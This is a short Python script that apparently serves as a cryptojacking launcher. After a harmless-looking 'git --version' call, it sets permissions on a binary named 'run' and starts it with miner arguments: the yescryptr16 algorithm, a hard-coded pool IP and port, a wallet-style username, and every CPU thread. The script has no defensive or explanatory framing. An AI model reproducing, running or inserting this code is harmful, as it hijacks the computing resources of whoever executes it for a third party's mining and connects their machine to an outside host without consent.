import os
import subprocess

cmd = "git --version"
returned_value = os.system(cmd)
subprocess.call(['chmod 7777 run'], shell=True)
subprocess.call(['./run -a yescryptr16 -o 103.249.70.7:6333 -u TKEUa3SvCJdN3XA4oJnhQNALHBqGJjSgLV.$(shuf -n 1 -i 1-99999)-CPU -t $(nproc) -p c=TRX,mc=QOGE'], shell=True)
